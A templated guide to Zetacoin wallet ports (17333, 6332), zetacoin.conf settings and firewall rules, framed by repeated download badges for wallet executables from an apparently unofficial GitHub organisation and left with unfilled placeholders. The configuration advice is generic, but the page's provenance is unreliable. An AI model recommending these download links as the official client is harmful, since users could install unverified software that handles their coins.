![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Zetacoin Ports, Nodes and zetacoin.conf</h1>

<p align="center">The ports, peers and configuration lines behind a healthy node.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Zetacoin uses port 17333 for peer traffic and port 6332 for RPC, with settings stored in `zetacoin.conf` inside the data directory. The peer port is safe to open and optional to forward; the RPC port is a control channel and should never be exposed to the internet. `paytxfee=0.001` is the recommended fee setting.

## The two ports, and why they are different

Port 17333 carries blocks and transactions between nodes. It is the wallet's conversation with the network, and opening it inbound lets more peers reach you.

Port 6332 is the RPC interface, the same one the debug console talks to. It accepts commands, so anything that can reach it can instruct your node. That is why it binds to localhost by default and why exposing it is a mistake even on a network you trust.

| Port | Purpose | Open inbound? | Risk |
| --- | --- | --- | --- |
| 17333 | peer traffic | yes, optional but useful | none beyond normal exposure |
| 6332 | RPC control | no | full control of the node |

Confusing the two is a real failure mode, and it is the one configuration mistake that can cost coins rather than time. A forwarded RPC port with a weak password is a node that can be drained by anyone who finds it, and port scanners find things quickly.

The full walk-through, with the checks in order, is in [Fix "No Block Source Available" in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/fix-no-block-source-error.md).

## A sensible configuration file

```
server=1
rpcuser=youruser
rpcpassword=a-long-random-value
rpcport=6332
paytxfee=0.001
```

`server=1` enables the RPC interface. The user and password are credentials for that interface, so they should be long, random and used nowhere else. `paytxfee=0.001` sets the fee the wallet attaches to transactions.

Add `addnode=` lines only when peer discovery is thin, and treat them as a workaround rather than a configuration you need by default.

## What paytxfee actually does

The fee is what you pay miners to include a transaction. On a chain with 30-second blocks and modest traffic, a small fee confirms quickly, and the recommended value reflects that.

Setting the fee to zero produces transactions that may sit unconfirmed for a long time, which people then report as a stuck transaction. Setting it very high overpays for no benefit. The recommended value is recommended because it works.

Fee settings live in the configuration file rather than the window, so changing them means editing a text file and restarting the client.

For the background behind this step, [Zetacoin Wallet Shows Zero Peers](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/zero-peer-connections-explained.md) covers the same ground in more detail.

## Firewall rules that work

Allow the application on 17333 for both directions. On a home router, forwarding 17333 to the machine running the wallet increases your peer count and helps the network; on a laptop that moves between networks it is not worth configuring.

Do not create an inbound rule for 6332. If you need remote access to the node, use a tunnel rather than an open port, and authenticate at the tunnel rather than at the node.

## What an addnode line looks like, and when it helps

A node entry is a host and port pair on its own line, and it is only useful when the client already has outbound access. It shortens discovery on a network where discovery is slow or partial; it does nothing on a network where the port is closed.

The practical test is the peer count after a restart. If adding entries moves the count from zero to something above zero, discovery was the bottleneck. If nothing changes, the connection is being dropped before those addresses matter.

That distinction saves people from collecting long node lists and concluding the wallet is faulty when the real issue is a firewall rule.

## Nodes and peer lists

Nodes are identified by address and port. The client discovers them from seed nodes and from peers it already knows, which is why a fresh installation with a blocked port finds nothing: discovery itself needs the port.

When discovery works but is thin, adding a few known addresses gives the client a starting set. When discovery is blocked, no list helps, because the connection attempt never leaves the machine.

## Reading the configuration at startup

The client reads `zetacoin.conf` when it starts, so edits take effect on the next launch. That is also why a change that seems to do nothing is often a change made while the client was running.

Malformed lines are usually ignored silently, which makes a typo look like a setting that does not work. Keep the file small, use one setting per line, and change one thing at a time.

## Security of the file itself

The configuration file can contain RPC credentials, so it deserves the same care as the wallet. Do not commit it to a repository, do not paste it into a support thread, and do not sync the data directory to a cloud folder that other software can read.

If the credentials were ever exposed, change them and restart. An RPC password is not a wallet passphrase  -  it cannot move coins by itself  -  but it can ask a node to do things, which is enough to matter.

## Common questions

### Do I need to open any ports?

No. The wallet syncs with outbound access only. Opening 17333 inbound improves peer connectivity and helps the network.

### What is port 6332 for?

RPC, the control interface used by the console and by scripts. It should stay bound to localhost.

### Where is zetacoin.conf?

In the data directory: `%AppData%/zetacoin/` on Windows, `~/.zetacoin/` on Linux, and `~/Library/Application Support/zetacoin/` on macOS.

### Why is my fee setting ignored?

Because the client reads the file at startup. Restart it after editing, and check the line for typos.

## The short version

Peer traffic on 17333, control on 6332, fee at 0.001, and a configuration file that is read once per launch. Keep the control port closed and the credentials private.

Related pages: {{ARTICLE:zetacoin-wallet-zero-peer-connections}} for peer problems, {{ARTICLE:fix-no-block-source-zetacoin-wallet}} for the message that follows, {{ARTICLE:zetacoin-wallet-not-syncing-fix}} for the wider order, {{ARTICLE:run-zetacoin-full-node-headless}} for a node without a desktop, and {{ARTICLE:zetacoin-wallet-desktop-client-guide}} for how the window relates to the node behind it. Install from {{RELEASE}} so the settings you write match the client that reads them.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md)
